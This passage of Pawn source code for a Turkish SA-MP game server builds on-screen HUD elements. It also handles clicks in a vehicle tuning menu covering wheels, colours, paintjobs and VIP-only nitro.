	PlayerTextDrawLetterSize(playerid,UI_OGBilgiH[playerid], 0.219999, 1.000000);
	PlayerTextDrawColor(playerid,UI_OGBilgiH[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_OGBilgiH[playerid], 0);
	PlayerTextDrawSetProportional(playerid,UI_OGBilgiH[playerid], 1);
	PlayerTextDrawSetShadow(playerid,UI_OGBilgiH[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_OGBilgiH[playerid], 0);

	UI_OGBilgi[playerid] = CreatePlayerTextDraw(playerid,496.000000, 155.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_OGBilgi[playerid], 255);
	PlayerTextDrawFont(playerid,UI_OGBilgi[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_OGBilgi[playerid], 0.180000, 0.899999);
	PlayerTextDrawColor(playerid,UI_OGBilgi[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_OGBilgi[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_OGBilgi[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_OGBilgi[playerid], 0);

	UI_OKBilgiH[playerid] = CreatePlayerTextDraw(playerid,510.000000, 187.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_OKBilgiH[playerid], 255);
	PlayerTextDrawFont(playerid,UI_OKBilgiH[playerid], 2);
	PlayerTextDrawLetterSize(playerid,UI_OKBilgiH[playerid], 0.219999, 1.000000);
	PlayerTextDrawColor(playerid,UI_OKBilgiH[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_OKBilgiH[playerid], 0);
	PlayerTextDrawSetProportional(playerid,UI_OKBilgiH[playerid], 1);
	PlayerTextDrawSetShadow(playerid,UI_OKBilgiH[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_OKBilgiH[playerid], 0);

	UI_OKBilgi[playerid] = CreatePlayerTextDraw(playerid,496.000000, 198.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_OKBilgi[playerid], 255);
	PlayerTextDrawFont(playerid,UI_OKBilgi[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_OKBilgi[playerid], 0.180000, 0.899999);
	PlayerTextDrawColor(playerid,UI_OKBilgi[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_OKBilgi[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_OKBilgi[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_OKBilgi[playerid], 0);

	UI_WantedL[playerid] = CreatePlayerTextDraw(playerid,499.000000, 117.000000, "]");
	PlayerTextDrawBackgroundColor(playerid,UI_WantedL[playerid], 255);
	PlayerTextDrawFont(playerid,UI_WantedL[playerid], 2);
	PlayerTextDrawLetterSize(playerid,UI_WantedL[playerid], 0.390000, 1.299999);
	PlayerTextDrawColor(playerid,UI_WantedL[playerid], -4194049);
	PlayerTextDrawSetOutline(playerid,UI_WantedL[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_WantedL[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_WantedL[playerid], 0);

	UI_Wanted[playerid] = CreatePlayerTextDraw(playerid,515.000000, 117.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_Wanted[playerid], 255);
	PlayerTextDrawFont(playerid,UI_Wanted[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_Wanted[playerid], 0.400000, 1.399999);
	PlayerTextDrawColor(playerid,UI_Wanted[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_Wanted[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_Wanted[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_Wanted[playerid], 0);

	return 1;
}

// LoadV5UI
LoadV5UI()
{
	// Alt Kýsým
	UI_AltBar = TextDrawCreate(-5.000000, 438.000000, "_");
	TextDrawBackgroundColor(UI_AltBar, 255);
	TextDrawFont(UI_AltBar, 1);
	TextDrawLetterSize(UI_AltBar, 0.500000, 1.000000);
	TextDrawColor(UI_AltBar, -1);
	TextDrawSetOutline(UI_AltBar, 0);
	TextDrawSetProportional(UI_AltBar, 1);
	TextDrawSetShadow(UI_AltBar, 1);
	TextDrawUseBox(UI_AltBar, 1);
	TextDrawBoxColor(UI_AltBar, 150);
	TextDrawTextSize(UI_AltBar, 647.000000, 0.000000);
	TextDrawSetSelectable(UI_AltBar, 0);

	UI_GMBilgi = TextDrawCreate(624.000000, 437.000000, "~w~Canakkale Meslek ~g~~h~~h~V5.1.1 U7");
	TextDrawAlignment(UI_GMBilgi, 3);
	TextDrawBackgroundColor(UI_GMBilgi, 255);
	TextDrawFont(UI_GMBilgi, 2);
	TextDrawLetterSize(UI_GMBilgi, 0.200000, 1.000000);
	TextDrawColor(UI_GMBilgi, -1);
	TextDrawSetOutline(UI_GMBilgi, 0);
	TextDrawSetProportional(UI_GMBilgi, 1);
	TextDrawSetShadow(UI_GMBilgi, 0);
	TextDrawSetSelectable(UI_GMBilgi, 0);

	UI_SCBilgi = TextDrawCreate(85.000000, 425.000000, "website~w~' ~p~~h~~h~Canakkale Meslek.com");
	TextDrawAlignment(UI_SCBilgi, 2);
	TextDrawBackgroundColor(UI_SCBilgi, 255);
	TextDrawFont(UI_SCBilgi, 1);
	TextDrawLetterSize(UI_SCBilgi, 0.259999, 1.200000);
	TextDrawColor(UI_SCBilgi, 16777215);
	TextDrawSetOutline(UI_SCBilgi, 0);
	TextDrawSetProportional(UI_SCBilgi, 1);
	TextDrawSetShadow(UI_SCBilgi, 1);
	TextDrawSetSelectable(UI_SCBilgi, 0);

	UI_SLogo = TextDrawCreate(526.000000, 374.000000, "TM_IMG:logo");
	TextDrawBackgroundColor(UI_SLogo, 255);
	TextDrawFont(UI_SLogo, 5);
	TextDrawLetterSize(UI_SLogo, 0.500000, 1.000000);
	TextDrawColor(UI_SLogo, -1);
	TextDrawSetOutline(UI_SLogo, 0);
	TextDrawSetProportional(UI_SLogo, 1);
	TextDrawSetShadow(UI_SLogo, 1);
	TextDrawUseBox(UI_SLogo, 1);
	TextDrawBoxColor(UI_SLogo, -1);
	TextDrawTextSize(UI_SLogo, 93.000000, 91.000000);
	TextDrawSetPreviewModel(UI_SLogo, 515);
	TextDrawSetPreviewRot(UI_SLogo, 0.000000, 0.000000, -90.000000, 1.000000);
	TextDrawSetSelectable(UI_SLogo, 0);
	TextDrawBackgroundColor(UI_SLogo, 0x00000000);
	TextDrawSetPreviewVehCol(UI_SLogo, 3, 1);

	// Sað Kýsým
	UI_ORBilgiL = TextDrawCreate(497.000000, 131.000000, "hud:radar_gangb");
	TextDrawBackgroundColor(UI_ORBilgiL, 255);
	TextDrawFont(UI_ORBilgiL, 4);
	TextDrawLetterSize(UI_ORBilgiL, 0.500000, 1.000000);
	TextDrawColor(UI_ORBilgiL, -1);
	TextDrawSetOutline(UI_ORBilgiL, 0);
	TextDrawSetProportional(UI_ORBilgiL, 1);
	TextDrawSetShadow(UI_ORBilgiL, 1);
	TextDrawUseBox(UI_ORBilgiL, 1);
	TextDrawBoxColor(UI_ORBilgiL, 255);
	TextDrawTextSize(UI_ORBilgiL, 9.000000, 8.000000);
	TextDrawSetSelectable(UI_ORBilgiL, 0);

	UI_OGBilgiL = TextDrawCreate(497.000000, 145.000000, "particle:target256");
	TextDrawBackgroundColor(UI_OGBilgiL, 255);
	TextDrawFont(UI_OGBilgiL, 4);
	TextDrawLetterSize(UI_OGBilgiL, 0.500000, 1.000000);
	TextDrawColor(UI_OGBilgiL, -4194049);
	TextDrawSetOutline(UI_OGBilgiL, 0);
	TextDrawSetProportional(UI_OGBilgiL, 1);
	TextDrawSetShadow(UI_OGBilgiL, 1);
	TextDrawUseBox(UI_OGBilgiL, 1);
	TextDrawBoxColor(UI_OGBilgiL, 255);
	TextDrawTextSize(UI_OGBilgiL, 9.000000, 8.000000);
	TextDrawSetSelectable(UI_OGBilgiL, 0);

	UI_OKBilgiL = TextDrawCreate(497.000000, 188.000000, "hud:radar_locosyndicate");
	TextDrawBackgroundColor(UI_OKBilgiL, 255);
	TextDrawFont(UI_OKBilgiL, 4);
	TextDrawLetterSize(UI_OKBilgiL, 0.500000, 1.000000);
	TextDrawColor(UI_OKBilgiL, -1);
	TextDrawSetOutline(UI_OKBilgiL, 0);
	TextDrawSetProportional(UI_OKBilgiL, 1);
	TextDrawSetShadow(UI_OKBilgiL, 1);
	TextDrawUseBox(UI_OKBilgiL, 1);
	TextDrawBoxColor(UI_OKBilgiL, 255);
	TextDrawTextSize(UI_OKBilgiL, 9.000000, 8.000000);
	TextDrawSetSelectable(UI_OKBilgiL, 0);

	UI_RMBilgiL = TextDrawCreate(497.000000, 214.000000, "ld_grav:timer");
	TextDrawBackgroundColor(UI_RMBilgiL, 255);
	TextDrawFont(UI_RMBilgiL, 4);
	TextDrawLetterSize(UI_RMBilgiL, 0.500000, 1.000000);
	TextDrawColor(UI_RMBilgiL, -1);
	TextDrawSetOutline(UI_RMBilgiL, 0);
	TextDrawSetProportional(UI_RMBilgiL, 1);
	TextDrawSetShadow(UI_RMBilgiL, 1);
	TextDrawUseBox(UI_RMBilgiL, 1);
	TextDrawBoxColor(UI_RMBilgiL, 255);
	TextDrawTextSize(UI_RMBilgiL, 9.000000, 8.000000);
	TextDrawSetSelectable(UI_RMBilgiL, 0);

	UI_RMBilgiH = TextDrawCreate(510.000000, 193.000000, "Iftar Vakitleri");
	TextDrawBackgroundColor(UI_RMBilgiH, 255);
	TextDrawFont(UI_RMBilgiH, 2);
	TextDrawLetterSize(UI_RMBilgiH, 0.219999, 1.000000);
	TextDrawColor(UI_RMBilgiH, -1);
	TextDrawSetOutline(UI_RMBilgiH, 0);
	TextDrawSetProportional(UI_RMBilgiH, 1);
	TextDrawSetShadow(UI_RMBilgiH, 1);
	TextDrawSetSelectable(UI_RMBilgiH, 0);

	UI_RMBilgi = TextDrawCreate(497.000000, 204.000000, "~r~~h~18:31 Samsun~n~~w~18:32 Sinop~n~~w~18:32 Sinop~n~~w~18:32 Sinop~n~~w~18:32 Sinop~n~~w~18:32 Sinop~n~~w~18:32 Sinop");
	TextDrawBackgroundColor(UI_RMBilgi, 255);
	TextDrawFont(UI_RMBilgi, 1);
	TextDrawLetterSize(UI_RMBilgi, 0.180000, 0.899999);
	TextDrawColor(UI_RMBilgi, -1);
	TextDrawSetOutline(UI_RMBilgi, 1);
	TextDrawSetProportional(UI_RMBilgi, 1);
	TextDrawSetSelectable(UI_RMBilgi, 0);


	// Üst Kýsým
	UI_TarihSaat = TextDrawCreate(635.000000, 2.000000, " ");
	TextDrawAlignment(UI_TarihSaat, 3);
	TextDrawBackgroundColor(UI_TarihSaat, 255);
	TextDrawFont(UI_TarihSaat, 2);
	TextDrawLetterSize(UI_TarihSaat, 0.209999, 1.000000);
	TextDrawColor(UI_TarihSaat, -1);
	TextDrawSetOutline(UI_TarihSaat, 1);
	TextDrawSetProportional(UI_TarihSaat, 1);
	TextDrawSetSelectable(UI_TarihSaat, 0);
	return 1;
}

/////////////////////////////////////////////////////////////////////////////////////////
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    // Araç Sahiplik Sistemi
	Galeri_ClickTextDraw(playerid, clickedid);

	// TMMobile Sistemi
	TMMobile_ClickTextDraw(playerid, clickedid);
	/* ESKÝ SÝSTEM
    MPUI_ClickTextDraw(playerid, clickedid);
    */

    // MeslekUI
	if(clickedid == Text:INVALID_TEXT_DRAW && MeslekUI_Mod[playerid] > 0)
	{
	    if(APlayerData[playerid][PlayerClass] == 0) return MeslekUI_Show(playerid);
	    if(MeslekUI_Mod[playerid] == 2)
	    {
			APlayerData[playerid][PlayerClass] = APlayerData[playerid][LastMesleks];
			MeslekUI_Mod[playerid] = 1;
			MeslekUI_Show(playerid);
			return 1;
	    }
	    if (APlayerData[playerid][PlayerLevel] > 0)
		{
			for(new i; i < 7; i++)
			{
				PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
			}
		}
		MeslekUI_Mod[playerid] = 0;
		MeslekUI_Show(playerid);
		Beklet(playerid);
	}

	// wtune
	new wVeiculo; wVeiculo = GetPlayerVehicleID(playerid);
	if(clickedid == wTuning1[6]) // X CLOSE
	{
		for(new i = 0; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) 	{ TextDrawHideForPlayer(playerid, wTuning5[i]); }
		CancelSelectTextDraw(playerid);
	}

	if(clickedid == wTuning1[7]) //WHEELS
	{

		for(new i = 14; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) 	{ TextDrawHideForPlayer(playerid, wTuning5[i]); }

		for(new i = 0; i < sizeof(wTuning2); i++) { TextDrawShowForPlayer(playerid, wTuning2[i]); }
	}
	if(clickedid == wTuning1[8]) // COLOR
	{

		for(new i = 14; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) { TextDrawHideForPlayer(playerid, wTuning5[i]); }

		for(new i = 11; i < sizeof(wTuning1); i++) { TextDrawShowForPlayer(playerid, wTuning1[i]); }
	}
	if(clickedid == wTuning1[9]) // PAINTJOBS
	{

		for(new i = 14; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) { TextDrawHideForPlayer(playerid, wTuning5[i]); }

		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawShowForPlayer(playerid, wTuning4[i]); }
	}
	if(clickedid == wTuning1[10]) // NITRO
	{

		for(new i = 14; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }

		for(new i = 0; i < sizeof(wTuning5); i++) { TextDrawShowForPlayer(playerid, wTuning5[i]); }
	}
	if(clickedid == wTuning1[11]) // HYDRAULICS
	{
		AddVehicleComponent(wVeiculo,1087);
	}
	if(clickedid == wTuning1[12]) //NEON
	{

		for(new i = 14; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) { TextDrawHideForPlayer(playerid, wTuning5[i]); }

		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawShowForPlayer(playerid, wTuning3[i]); }
	}
	if(clickedid == wTuning1[13]) //AUTO TUNING
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483)
		{

			AddVehicleComponent(wVeiculo,1027);
			ChangeVehiclePaintjob(wVeiculo, 0);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562)
		{
			AddVehicleComponent(wVeiculo,1046);
			AddVehicleComponent(wVeiculo,1171);
			AddVehicleComponent(wVeiculo,1149);
			AddVehicleComponent(wVeiculo,1035);
			AddVehicleComponent(wVeiculo,1147);
			AddVehicleComponent(wVeiculo,1036);
			AddVehicleComponent(wVeiculo,1040);
			ChangeVehiclePaintjob(wVeiculo, 2);
			ChangeVehicleColor(wVeiculo, 6, 6);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
		{
			AddVehicleComponent(wVeiculo,1028);
			AddVehicleComponent(wVeiculo,1169);
			AddVehicleComponent(wVeiculo,1141);
			AddVehicleComponent(wVeiculo,1032);
			AddVehicleComponent(wVeiculo,1138);
			AddVehicleComponent(wVeiculo,1026);
			AddVehicleComponent(wVeiculo,1027);
			ChangeVehiclePaintjob(wVeiculo, 2);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565)
		{


			AddVehicleComponent(wVeiculo,1046);
			AddVehicleComponent(wVeiculo,1153);
			AddVehicleComponent(wVeiculo,1150);
			AddVehicleComponent(wVeiculo,1054);
			AddVehicleComponent(wVeiculo,1049);
			AddVehicleComponent(wVeiculo,1047);
			AddVehicleComponent(wVeiculo,1051);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 2);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559)
		{

			AddVehicleComponent(wVeiculo,1065);
			AddVehicleComponent(wVeiculo,1160);
			AddVehicleComponent(wVeiculo,1159);
			AddVehicleComponent(wVeiculo,1067);
			AddVehicleComponent(wVeiculo,1162);
			AddVehicleComponent(wVeiculo,1069);
			AddVehicleComponent(wVeiculo,1071);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 1);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561)
		{

			AddVehicleComponent(wVeiculo,1064);
			AddVehicleComponent(wVeiculo,1155);
			AddVehicleComponent(wVeiculo,1154);
			AddVehicleComponent(wVeiculo,1055);
			AddVehicleComponent(wVeiculo,1158);
			AddVehicleComponent(wVeiculo,1056);
			AddVehicleComponent(wVeiculo,1062);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 2);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558)
		{
			AddVehicleComponent(wVeiculo,1089);
			AddVehicleComponent(wVeiculo,1166);
			AddVehicleComponent(wVeiculo,1168);
			AddVehicleComponent(wVeiculo,1088);
			AddVehicleComponent(wVeiculo,1164);
			AddVehicleComponent(wVeiculo,1090);
			AddVehicleComponent(wVeiculo,1094);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 2);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575)
		{
			AddVehicleComponent(wVeiculo,1044);
			AddVehicleComponent(wVeiculo,1174);
			AddVehicleComponent(wVeiculo,1176);
			AddVehicleComponent(wVeiculo,1042);
			AddVehicleComponent(wVeiculo,1099);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 0);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)
		{
			AddVehicleComponent(wVeiculo,1126);
			AddVehicleComponent(wVeiculo,1179);
			AddVehicleComponent(wVeiculo,1180);
			AddVehicleComponent(wVeiculo,1122);
			AddVehicleComponent(wVeiculo,1101);
			AddVehicleComponent(wVeiculo,1125);
			AddVehicleComponent(wVeiculo,1123);
			AddVehicleComponent(wVeiculo,1100);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 2);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)
		{
			AddVehicleComponent(wVeiculo,1104);
			AddVehicleComponent(wVeiculo,1182);
			AddVehicleComponent(wVeiculo,1184);
			AddVehicleComponent(wVeiculo,1108);
			AddVehicleComponent(wVeiculo,1107);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 1);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)
		{
			AddVehicleComponent(wVeiculo,1129);
			AddVehicleComponent(wVeiculo,1189);
			AddVehicleComponent(wVeiculo,1187);
			AddVehicleComponent(wVeiculo,1102);
			AddVehicleComponent(wVeiculo,1133);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			ChangeVehiclePaintjob(wVeiculo, 2);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420)
		{
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1087);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1139);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 400)
		{
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1087);
			AddVehicleComponent(wVeiculo,1018);
			AddVehicleComponent(wVeiculo,1013);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1086);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 401)
		{
			AddVehicleComponent(wVeiculo,1086);
			AddVehicleComponent(wVeiculo,1139);
			AddVehicleComponent(wVeiculo,1079);
			//AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1087);
			AddVehicleComponent(wVeiculo,1012);
			AddVehicleComponent(wVeiculo,1013);
			AddVehicleComponent(wVeiculo,1042);
			AddVehicleComponent(wVeiculo,1043);
			AddVehicleComponent(wVeiculo,1018);
			AddVehicleComponent(wVeiculo,1006);
			AddVehicleComponent(wVeiculo,1007);
			AddVehicleComponent(wVeiculo,1017);
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576)
		{
			ChangeVehiclePaintjob(wVeiculo,2);
			AddVehicleComponent(wVeiculo,1191);
			AddVehicleComponent(wVeiculo,1193);
		//	AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1018);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
			AddVehicleComponent(wVeiculo,1134);
			AddVehicleComponent(wVeiculo,1137);
		}
		else
		{
		//	AddVehicleComponent(wVeiculo,1010);
			AddVehicleComponent(wVeiculo,1079);
			AddVehicleComponent(wVeiculo,1087);
		}

		return 1;
	}
	if(clickedid == wTuning2[0]){ // SHADOW
		AddVehicleComponent(wVeiculo,1073);
		return 1;
	}
	if(clickedid == wTuning2[1]){ // MEGA
		AddVehicleComponent(wVeiculo, 1074);
		return 1;
	}
	if(clickedid == wTuning2[2]){  // RINSHIME
		AddVehicleComponent(wVeiculo,1075);
		return 1;
	}
	if(clickedid == wTuning2[3]){ // WIRES
		AddVehicleComponent(wVeiculo,1076);
		return 1;
	}
	if(clickedid == wTuning2[4]){ // CLASSIC
		AddVehicleComponent(wVeiculo,1077);
		return 1;
	}
	if(clickedid == wTuning2[5]){ // TWIST
		AddVehicleComponent(wVeiculo,1078);
		return 1;
	}
	if(clickedid == wTuning2[6]){ // CUTTER
		AddVehicleComponent(wVeiculo,1079);
		return 1;
	}
	if(clickedid == wTuning2[7]){ // DOLLAR
		AddVehicleComponent(wVeiculo,1083);
		return 1;
	}
	if(clickedid == wTuning2[8]){ // ATOMIC
		AddVehicleComponent(wVeiculo,1085);
		return 1;
	}

	if(clickedid == wTuning1[14]){ // BLACK
		ChangeVehicleColor(wVeiculo, 0, 0);
		return 1;
	}
	if(clickedid == wTuning1[15]){ // WHITE
		ChangeVehicleColor(wVeiculo, 1, 1);
		return 1;
	}
	if(clickedid == wTuning1[16]){ // GREEN
		ChangeVehicleColor(wVeiculo, 128, 128);
		return 1;
	}
	if(clickedid == wTuning1[17]){ // CYAN
		ChangeVehicleColor(wVeiculo, 135, 135);
		return 1;
	}
	if(clickedid == wTuning1[18]){ // BLUE
		ChangeVehicleColor(wVeiculo, 152, 152);
		return 1;
	}
	if(clickedid == wTuning1[19]){ // YELLOW
		ChangeVehicleColor(wVeiculo, 6, 6);
		return 1;
	}
	if(clickedid == wTuning1[20]){ // GRAY
		ChangeVehicleColor(wVeiculo, 252, 252);
		return 1;
	}
	if(clickedid == wTuning1[21]){ // RED
		ChangeVehicleColor(wVeiculo, 3, 3);
		return 1;
	}
	if(clickedid == wTuning1[22]){ // ORANGE
		ChangeVehicleColor(wVeiculo, 219, 219);
		return 1;
	}
	if(clickedid == wTuning4[0]){ // PAINTJOBS 1
		ChangeVehiclePaintjob(wVeiculo, 0);
		return 1;
	}
	if(clickedid == wTuning4[1]){ // PAINTJOBS 2
		ChangeVehiclePaintjob(wVeiculo, 2);
		return 1;
	}
	if(clickedid == wTuning4[2]){ // PAINTJOBS 2
		ChangeVehiclePaintjob(wVeiculo, 3);
		return 1;
	}
	if(clickedid == wTuning5[0])
	{ // NITRO 1
		if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		AddVehicleComponent(wVeiculo,1009);
		}
		else
		{
		SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}VIP DEGILSINIZ !!");
		}
		return 1;
	}
	if(clickedid == wTuning5[1])
	{ // NITRO 2
		if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		AddVehicleComponent(wVeiculo,1008);
		}
		else
		{
		SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}VIP DEGILSINIZ !!");
		}
		return 1;
	}
	if(clickedid == wTuning5[2])
	{ // NITRO 3
		if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		AddVehicleComponent(wVeiculo,1010);
		}
		else
		{
		SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}VIP DEGILSINIZ !!");
		}
		return 1;
	}

	/*if(clickedid == wTuning3[0]){
		SetPVarInt(playerid, "neon", 1);
		SetPVarInt(playerid, "blue", CreateObject(18648,0,0,0,0,0,0));
		SetPVarInt(playerid, "blue1", CreateObject(18648,0,0,0,0,0,0));
		AttachObjectToVehicle(GetPVarInt(playerid, "blue"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(GetPVarInt(playerid, "blue1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		return 1;
	}

	if(clickedid == wTuning3[1]){
		SetPVarInt(playerid, "neon", 1);
		SetPVarInt(playerid, "yellow", CreateObject(18650,0,0,0,0,0,0));
		SetPVarInt(playerid, "yellow1", CreateObject(18650,0,0,0,0,0,0));
		AttachObjectToVehicle(GetPVarInt(playerid, "yellow"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(GetPVarInt(playerid, "yellow1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		return 1;
	}
	if(clickedid == wTuning3[2]){
		SetPVarInt(playerid, "neon", 1);
		SetPVarInt(playerid, "white", CreateObject(18652,0,0,0,0,0,0));
		SetPVarInt(playerid, "white1", CreateObject(18652,0,0,0,0,0,0));
		AttachObjectToVehicle(GetPVarInt(playerid, "white"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(GetPVarInt(playerid, "white1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		return 1;
	}
	if(clickedid == wTuning3[3]){
		SetPVarInt(playerid, "neon", 1);
		SetPVarInt(playerid, "pink", CreateObject(18651,0,0,0,0,0,0));
		SetPVarInt(playerid, "pink1", CreateObject(18651,0,0,0,0,0,0));
		AttachObjectToVehicle(GetPVarInt(playerid, "pink"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(GetPVarInt(playerid, "pink1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		return 1;
	}
	if(clickedid == wTuning3[4]){
		SetPVarInt(playerid, "neon", 1);
		SetPVarInt(playerid, "green", CreateObject(18649,0,0,0,0,0,0));
		SetPVarInt(playerid, "green1", CreateObject(18649,0,0,0,0,0,0));
